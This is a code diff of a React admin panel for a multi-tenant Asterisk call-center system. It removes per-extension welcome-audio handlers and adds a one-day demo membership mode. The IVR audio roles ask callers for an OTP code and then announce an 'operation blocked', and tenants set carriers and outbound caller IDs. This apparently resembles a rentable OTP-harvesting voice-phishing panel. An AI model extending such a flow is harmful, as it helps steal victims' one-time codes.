@@ -500,11 +500,6 @@ export default function App() {
     press1_welcome: 'custom/bienvenida_corporativa',
     agent_transfer: 'custom/conectar_asesor',
     press1_invalid: 'custom/opcion_invalida',
-    welcome_3333: 'custom/solicitar_codigo_otp',
-    welcome_4444: 'custom/solicitar_codigo_otp',
-    welcome_5555: 'custom/solicitar_codigo_otp',
-    welcome_6666: 'custom/bienvenida_6666',
-    welcome_7777: 'custom/solicitar_codigo_otp',
     otp_welcome: 'custom/solicitar_codigo_otp',
     otp_wait: 'custom/un_momento_validando_informacion',
     otp_success: 'custom/operacion_bloqueada_exito',
@@ -512,19 +507,16 @@ export default function App() {
     hold_music: 'default',
   });
 
-  // Manual Locks State for Audios 6666, 7777 and IVR Script/Entity
+  // Manual Locks State for IVR Script/Entity & Dynamic OTP Extensions (4001+)
   const [manualLocks, setManualLocks] = useState<{
-    welcome_6666: boolean;
-    welcome_7777: boolean;
     ivr_entity: boolean;
+    [key: string]: boolean | undefined;
   }>(() => {
     try {
       const saved = localStorage.getItem('ast20_audio_locks_ui');
       if (saved) return JSON.parse(saved);
     } catch (_) {}
     return {
-      welcome_6666: false,
-      welcome_7777: false,
       ivr_entity: false,
     };
   });
@@ -756,18 +748,11 @@ export default function App() {
       .then((r) => r.json())
       .then((data) => {
         if (data.success && data.assignments) {
-          setActiveAudioAssignments((prev) => {
-            const next = { ...data.assignments };
-            // Protect locked 6666 and 7777 audio configurations
-            if (manualLocks.welcome_6666 && prev.welcome_6666) next.welcome_6666 = prev.welcome_6666;
-            if (manualLocks.welcome_7777 && prev.welcome_7777) next.welcome_7777 = prev.welcome_7777;
-            return next;
-          });
+          setActiveAudioAssignments(data.assignments);
           if (data.manualLocks) {
             setManualLocks((prev) => ({
               ...prev,
-              welcome_6666: prev.welcome_6666 || !!data.manualLocks.welcome_6666,
-              welcome_7777: prev.welcome_7777 || !!data.manualLocks.welcome_7777,
+              ...data.manualLocks,
               ivr_entity: prev.ivr_entity || !!data.manualLocks.ivr_entity,
             }));
           }
@@ -932,9 +917,19 @@ export default function App() {
   }, [tenants, isAuthenticated]);
 
   // Call Center Tenants Handlers
-  const handleAddTenant = async (newTenant: CallCenterTenant, activateInitialMonth?: boolean) => {
+  const handleAddTenant = async (
+    newTenant: CallCenterTenant,
+    activationMode?: 'initial_month' | 'demo_1_day' | 'none' | boolean
+  ) => {
+    const resolvedMode: 'initial_month' | 'demo_1_day' | 'none' =
+      activationMode === true
+        ? 'initial_month'
+        : activationMode === 'initial_month' || activationMode === 'demo_1_day'
+        ? activationMode
+        : 'none';
+
     const updatedList = [newTenant, ...tenants];
-    if (activateInitialMonth && currentUser?.role === 'admin' && !currentUser?.tenantId) {
+    if (resolvedMode !== 'none' && currentUser?.role === 'admin' && !currentUser?.tenantId) {
       lastSavedTenantsJsonRef.current = serializeTenantsCore(updatedList);
     }
     setTenants(updatedList);
@@ -943,7 +938,7 @@ export default function App() {
       `Nuevo Grupo de Call Center creado: "${newTenant.name}" (Rango ${newTenant.extensionStart}-${newTenant.extensionEnd}, Contexto [${newTenant.dialplanContext}])`,
       `Tenant: ${newTenant.code}\nExtensiones: ${newTenant.extensionStart}-${newTenant.extensionEnd}\nCarrier: ${newTenant.carrierId}\nCallerID: ${newTenant.outboundCallerId}`
     );
-    if (activateInitialMonth && currentUser?.role === 'admin' && !currentUser?.tenantId) {
+    if (resolvedMode !== 'none' && currentUser?.role === 'admin' && !currentUser?.tenantId) {
       try {
         await fetch('/api/tenants', {
           method: 'POST',
@@ -956,12 +951,19 @@ export default function App() {
           body: JSON.stringify({
             targetType: 'tenant',
             targetId: newTenant.id,
-            action: 'initial_month',
-            notes: 'Activación inicial de 1 Mes al crear Call Center',
+            action: resolvedMode,
+            notes:
+              resolvedMode === 'demo_1_day'
+                ? 'Demo de Prueba (1 Día) activado al crear Call Center'
+                : 'Activación inicial de 1 Mes al crear Call Center',
           }),
         });
         await refreshMembershipOverview();
-        showToast(`Call Center "${newTenant.name}" creado con Membresía Principal de 1 Mes activa.`);
+        showToast(
+          resolvedMode === 'demo_1_day'
+            ? `Call Center "${newTenant.name}" creado con Demo de Prueba (1 Día) activo.`
+            : `Call Center "${newTenant.name}" creado con Membresía Principal de 1 Mes activa.`
+        );
         return;
       } catch (_) {}
     }
@@ -1056,6 +1058,7 @@ export default function App() {
   const [membershipSettings, setMembershipSettings] = useState<MembershipSettings>({
     enforceMembershipSystem: true,
     initialMonthDays: 30,
+    demoDays: 1,
     weekDays: 7,
     initialMonthPriceUsd: 150,
     weeklyPriceUsd: 45,
@@ -1652,86 +1655,6 @@ export default function App() {
     }).catch(() => {});
   };
 
-  const handleAssignTo7777 = (audioId: string) => {
-    const audio = audios.find((a) => a.id === audioId);
-    if (!audio) return;
-    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 7777.`);
-    addLog(
-      'AMI',
-      `Bienvenida Extensión 7777 actualizada: ${audio.fileName}`,
-      `AstDB: database put ivr_vars 7777_intro "${audio.asteriskPath}"`
-    );
-    fetch('/api/asterisk/audio/assign', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'welcome_7777', asteriskPath: audio.asteriskPath }),
-    }).catch(() => {});
-  };
-
-  const handleAssignTo3333 = (audioId: string) => {
-    const audio = audios.find((a) => a.id === audioId);
-    if (!audio) return;
-    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 3333.`);
-    addLog(
-      'AMI',
-      `Bienvenida Extensión 3333 actualizada: ${audio.fileName}`,
-      `AstDB: database put ivr_vars 3333_intro "${audio.asteriskPath}"`
-    );
-    fetch('/api/asterisk/audio/assign', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'welcome_3333', asteriskPath: audio.asteriskPath }),
-    }).catch(() => {});
-  };
-
-  const handleAssignTo4444 = (audioId: string) => {
-    const audio = audios.find((a) => a.id === audioId);
-    if (!audio) return;
-    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 4444.`);
-    addLog(
-      'AMI',
-      `Bienvenida Extensión 4444 actualizada: ${audio.fileName}`,
-      `AstDB: database put ivr_vars 4444_intro "${audio.asteriskPath}"`
-    );
-    fetch('/api/asterisk/audio/assign', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'welcome_4444', asteriskPath: audio.asteriskPath }),
-    }).catch(() => {});
-  };
-
-  const handleAssignTo5555 = (audioId: string) => {
-    const audio = audios.find((a) => a.id === audioId);
-    if (!audio) return;
-    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 5555.`);
-    addLog(
-      'AMI',
-      `Bienvenida Extensión 5555 actualizada: ${audio.fileName}`,
-      `AstDB: database put ivr_vars 5555_intro "${audio.asteriskPath}"`
-    );
-    fetch('/api/asterisk/audio/assign', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'welcome_5555', asteriskPath: audio.asteriskPath }),
-    }).catch(() => {});
-  };
-
-  const handleAssignTo6666 = (audioId: string) => {
-    const audio = audios.find((a) => a.id === audioId);
-    if (!audio) return;
-    showToast(`Audio "${audio.name}" asignado a Bienvenida de Extensión 6666.`);
-    addLog(
-      'AMI',
-      `Bienvenida Extensión 6666 actualizada: ${audio.fileName}`,
-      `AstDB: database put ivr_vars 6666_intro "${audio.asteriskPath}"`
-    );
-    fetch('/api/asterisk/audio/assign', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ role: 'welcome_6666', asteriskPath: audio.asteriskPath }),
-    }).catch(() => {});
-  };
-
   const handleAssignToOtp = (audioId: string) => {
     setOtpConfig((prev) => ({ ...prev, welcomeAudioId: audioId }));
     const audio = audios.find((a) => a.id === audioId);
@@ -1744,7 +1667,17 @@ export default function App() {
   };
 
   // User Handlers with Auto-provisioning in Asterisk 20 PJSIP
-  const handleAddUser = (newUser: SystemUser, activateInitialMonth?: boolean) => {
+  const handleAddUser = (
+    newUser: SystemUser,
+    activationMode?: 'initial_month' | 'demo_1_day' | 'none' | boolean
+  ) => {
+    const resolvedActivationMode: 'initial_month' | 'demo_1_day' | 'none' =
+      activationMode === true
+        ? 'initial_month'
+        : activationMode === 'initial_month' || activationMode === 'demo_1_day'
+        ? activationMode
+        : 'none';
+
     const updatedUsersList = [...users, newUser];
     setUsers(updatedUsersList);
     const cleanUser = String(newUser.username || newUser.email.split('@')[0]).trim().toLowerCase().replace(/[^a-z0-9_\-]/g, '');
@@ -1788,7 +1721,11 @@ export default function App() {
       fetch('/api/users/sync-sip', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ user: newUser, activateInitialMonth: Boolean(activateInitialMonth) }),
+        body: JSON.stringify({
+          user: newUser,
+          initialActivationMode: resolvedActivationMode,
+          activateInitialMonth: resolvedActivationMode === 'initial_month',
+        }),
       })
         .then(() => refreshMembershipOverview())
         .catch(() => {});
@@ -1799,7 +1736,11 @@ export default function App() {
       `[USUARIOS] Nuevo usuario creado y registrado en Asterisk PJSIP: ${newUser.name} (${cleanUser})`,
       `Contraseña sincronizada para MicroSIP puerto 47923`
     );
-    showToast(`Usuario ${newUser.name} creado y registrado en Asterisk 20.`);
+    showToast(
+      resolvedActivationMode === 'demo_1_day'
+        ? `Usuario ${newUser.name} creado con Demo de 1 Día activo en Asterisk 20.`
+        : `Usuario ${newUser.name} creado y registrado en Asterisk 20.`
+    );
   };
 
   const handleUpdateUser = (updatedUser: SystemUser) => {
@@ -2364,11 +2305,6 @@ export default function App() {
             onAssignToPress1={handleAssignToPress1}
             onAssignToOtp={handleAssignToOtp}
             onAssignToAgentTransfer={handleAssignToAgentTransfer}
-            onAssignTo7777={handleAssignTo7777}
-            onAssignTo6666={handleAssignTo6666}
-            onAssignTo5555={handleAssignTo5555}
-            onAssignTo4444={handleAssignTo4444}
-            onAssignTo3333={handleAssignTo3333}
             activeAssignments={activeAudioAssignments}
             onAssignRole={handleAssignRole}
             lockedConfigs={manualLocks}
